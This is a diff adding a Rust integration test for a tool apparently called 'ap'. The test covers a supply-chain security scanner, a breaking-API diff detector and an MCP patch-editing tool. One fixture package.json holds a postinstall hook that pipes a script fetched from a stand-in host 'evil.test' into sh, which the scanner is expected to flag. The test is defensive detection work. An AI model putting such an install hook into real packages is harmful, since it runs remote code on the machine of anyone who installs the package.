@@ -8780,3 +8780,155 @@ fn test_v253_dead_code_audit_codex_patch_read_limit_and_sed_accel() {
         "{dead_md}"
     );
 }
+
+#[test]
+fn test_v254_supply_chain_sec_breaking_api_diff_and_mcp_codex_edit() {
+    let dir = tempfile::tempdir().unwrap();
+    let root = dir.path();
+    fs::create_dir_all(root.join("src")).unwrap();
+
+    // 1. Supply-chain manifest hygiene via `ap guard sec`
+    fs::write(
+        root.join("package.json"),
+        r#"{
+  "name": "demo",
+  "scripts": { "postinstall": "curl -fsSL https://evil.test/x.sh | sh" },
+  "dependencies": { "express": "^4.18.0", "driftPkg": "^1.0.0", "barePkg": "latest" }
+}"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join("package-lock.json"),
+        r#"{ "lockfileVersion": 3, "packages": { "node_modules/express": {}, "node_modules/barePkg": {} } }"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join(".mcp.json"),
+        r#"{ "mcpServers": { "srv": { "command": "npx", "args": ["-y", "@org/mcp-srv"] } } }"#,
+    )
+    .unwrap();
+
+    let root_s = root.to_string_lossy().to_string();
+    let sec_bad = run_ap(root, &["guard", "sec", &root_s, "--json"], None, &[]);
+    assert!(!sec_bad.status.success());
+    let sv: Value = serde_json::from_slice(&sec_bad.stdout).unwrap();
+    let cwes: Vec<&str> = sv["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter_map(|f| f["cwe"].as_str())
+        .collect();
+    assert!(cwes.iter().any(|c| c.contains("CWE-506")), "{sv}");
+    assert!(cwes.iter().any(|c| c.contains("Lockfile Drift")), "{sv}");
+    assert!(
+        cwes.iter().any(|c| c.contains("Unpinned Ephemeral MCP")),
+        "{sv}"
+    );
+
+    // Fix manifests -> `ap guard sec` passes (exit 0)
+    fs::write(
+        root.join("package.json"),
+        r#"{ "name": "demo", "scripts": { "build": "tsc" }, "dependencies": { "express": "^4.18.0" } }"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join("package-lock.json"),
+        r#"{ "lockfileVersion": 3, "packages": { "node_modules/express": {} } }"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join(".mcp.json"),
+        r#"{ "mcpServers": { "srv": { "command": "npx", "args": ["-y", "@org/mcp-srv@1.2.3"] } } }"#,
+    )
+    .unwrap();
+    let sec_ok = run_ap(root, &["guard", "sec", &root_s, "--json"], None, &[]);
+    assert!(sec_ok.status.success());
+
+    // 2. Breaking public API diff detector (`ap guard diff`) emits advisory `api_changes` while returning 0
+    fs::write(
+        root.join("src/api.ts"),
+        "export function charge(a: number) { return a; }\nexport function droppedExport() { return 0; }\n",
+    )
+    .unwrap();
+    let git_ok = std::process::Command::new("git")
+        .args(["init"])
+        .current_dir(root)
+        .status()
+        .map(|s| s.success())
+        .unwrap_or(false);
+    if git_ok {
+        let _ = std::process::Command::new("git")
+            .args(["config", "user.email", "t@example.com"])
+            .current_dir(root)
+            .status();
+        let _ = std::process::Command::new("git")
+            .args(["config", "user.name", "T"])
+            .current_dir(root)
+            .status();
+        let _ = std::process::Command::new("git")
+            .args(["add", "."])
+            .current_dir(root)
+            .status();
+        let _ = std::process::Command::new("git")
+            .args(["commit", "-m", "init"])
+            .current_dir(root)
+            .status();
+        fs::write(
+            root.join("src/api.ts"),
+            "export function charge(a: number, currency: string) { return `${a}${currency}`; }\n",
+        )
+        .unwrap();
+        let diff_out = run_ap(root, &["guard", "diff", &root_s, "--json"], None, &[]);
+        assert!(diff_out.status.success());
+        let dv: Value = serde_json::from_slice(&diff_out.stdout).unwrap();
+        let api_changes = dv["api_changes"].as_array().unwrap();
+        assert!(
+            api_changes
+                .iter()
+                .any(|c| c["kind"] == "BREAKING-API-SIGNATURE" && c["symbol"] == "charge"),
+            "{dv}"
+        );
+        assert!(
+            api_changes
+                .iter()
+                .any(|c| c["kind"] == "BREAKING-API-REMOVED" && c["symbol"] == "droppedExport"),
+            "{dv}"
+        );
+    }
+
+    // 3. MCP exact `37` tools + `ap_edit` Codex `*** Begin Patch` success & explicit error on invalid diff
+    let mcp_req = [
+        serde_json::json!({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2025-11-25"}}).to_string(),
+        serde_json::json!({"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}}).to_string(),
+        serde_json::json!({"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {
+            "name": "ap_edit",
+            "arguments": {
+                "cwd": root_s,
+                "diff": "*** Begin Patch\n*** Add File: src/v83.ts\n+export const V83 = true;\n*** End Patch\n"
+            }
+        }}).to_string(),
+        serde_json::json!({"jsonrpc": "2.0", "id": 4, "method": "tools/call", "params": {
+            "name": "ap_edit",
+            "arguments": { "cwd": root_s, "diff": "*** Begin Patch\n*** End Patch\n" }
+        }}).to_string(),
+    ]
+    .join("\n")
+        + "\n";
+    let mcp_out = run_ap(root, &["mcp"], Some(&mcp_req), &[]);
+    assert!(mcp_out.status.success());
+    let resps: Vec<Value> = String::from_utf8_lossy(&mcp_out.stdout)
+        .lines()
+        .filter(|l| !l.trim().is_empty())
+        .map(|l| serde_json::from_str::<Value>(l).unwrap())
+        .collect();
+    assert_eq!(resps[1]["result"]["tools"].as_array().unwrap().len(), 37);
+    assert_eq!(resps[2]["result"]["isError"], false, "{}", resps[2]);
+    assert!(fs::read_to_string(root.join("src/v83.ts"))
+        .unwrap()
+        .contains("V83 = true"));
+    assert_eq!(resps[3]["result"]["isError"], true, "{}", resps[3]);
+    assert!(resps[3]["result"]["content"][0]["text"]
+        .as_str()
+        .unwrap_or("")
+        .contains("invalid `diff` patch"));
+}
